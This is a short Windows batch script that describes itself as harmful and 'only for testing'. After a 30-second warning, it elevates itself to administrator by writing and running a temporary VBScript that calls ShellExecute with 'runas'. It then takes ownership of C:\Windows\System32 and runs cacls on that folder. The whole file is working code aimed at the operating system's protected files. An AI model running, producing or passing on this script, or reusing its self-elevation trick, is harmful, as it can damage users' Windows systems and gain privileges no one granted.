@echo off
echo This will harm your computer if you ran this file with admin privs. You have 30 seconds to exit out of this prompt. Upon exiting, please delete this file. This file is only for testing.
timeout /t 30 /nobreak

:: Get ADMIN Privs
:-------------------------------------
mkdir "%windir%\BatchGotAdmin"
if '%errorlevel%' == '0' (
  rmdir "%windir%\BatchGotAdmin" & goto gotAdmin 
) else ( goto UACPrompt )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute %~s0, "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"      
    CD /D "%~dp0"
:-------------------------------------
:: End Get ADMIN Privs
takeown /f C:\Windows\System32
cacls C:\Windows\System32
